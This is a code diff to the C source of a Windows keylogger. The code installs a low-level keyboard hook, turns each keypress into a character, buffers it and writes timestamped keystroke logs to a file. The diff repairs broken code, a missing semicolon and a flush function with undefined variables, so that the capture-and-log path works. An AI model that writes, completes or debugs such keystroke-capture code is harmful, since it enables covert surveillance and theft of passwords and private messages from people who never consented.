@@ -9,6 +9,7 @@ time_t lastKeypressTime = 0;
 static char buffer[MAX_BUFFER_LEN];
 static int index = 0;
 
+
 char getTypedChar(DWORD vkCode, DWORD scanCode) {
     BYTE keyboardState[256];
     WCHAR unicodeChar[5];
@@ -33,6 +34,28 @@ char getTypedChar(DWORD vkCode, DWORD scanCode) {
     return '\0';
 }
 
+
+void flushBuffer(bool withTimestamp)
+{
+    if (index == 0) return;
+
+    // append mode
+    FILE* file = fopen(LOG_FILE_PATH, "a+");
+    if (file) {
+        if (withTimestamp) {
+            time_t now = time(0);
+            struct tm* t = localtime(&now);
+            fprintf(file, "[%04d-%02d-%02d %02d:%02d:%02d] ",
+                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+                t->tm_hour, t->tm_min, t->tm_sec);
+        }
+        buffer[index] = '\0';
+        fprintf(file, "%s\n", buffer);
+        fclose(file);
+    }
+    index = 0;
+}
+
 /**
  * nCode: whether to process the message. != HC_ACTION means event shouldn't be processed. Pass along.
  * mParam: type of keyboard message
@@ -40,17 +63,17 @@ char getTypedChar(DWORD vkCode, DWORD scanCode) {
  */
 LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
+
     // Only record key pressed event
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
     {
         KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = p->vkCode;
-
-        time_t now = time(0);
         bool flushWithTimestamp = false;
 
+        time_t now = time(0);
         if (now - lastKeypressTime >= FLUSH_INTERVAL) {
-            flushWithTimestamp = true
+            flushWithTimestamp = true;
             flushBuffer(flushWithTimestamp);
         }
 
@@ -115,28 +138,6 @@ BOOL installHook()
     return hHook != NULL;
 }
 
-
-
-void flush_buffer(char* buffer)
-{
-    if (index == 0) return;
-
-    // append mode
-    FILE* file = fopen(LOG_FILE_PATH, "a+");
-    if (file) {
-        if (withTimestamp) {
-            time_t now = time(0);
-            struct tm* t = localtime(&now);
-            fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] ",
-                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
-                t->tm_hour, t->tm_min, t->tm_sec);
-        }
-        buffer[index] = '\0';
-        fprintf(f, "%s\n", buffer);
-        fclose(f);
-    }
-    index = 0;
-}
 
 
 void uninstallHook()
